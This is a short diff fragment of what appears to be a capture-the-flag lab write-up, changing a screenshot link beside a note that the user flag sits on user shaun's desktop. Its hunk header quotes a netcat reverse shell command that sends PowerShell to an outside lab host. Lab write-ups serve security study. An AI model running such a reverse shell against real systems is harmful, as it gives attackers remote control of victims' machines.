@@ -65,7 +65,8 @@ nc.exe 10.10.14.25 1337 -e powershell
 
 ### On the desktop of the user shaun we find the users flag
 
-<img width="354" height="85" alt="image" src="https://github.com/user-attachments/assets/a5282bc8-9e8c-44e9-9f8e-b23f0d152a1a" />
+<img width="355" height="63" alt="image" src="https://github.com/user-attachments/assets/8eda17ae-9d8e-4df2-a808-a30d35dfc125" />
+
 
 
 
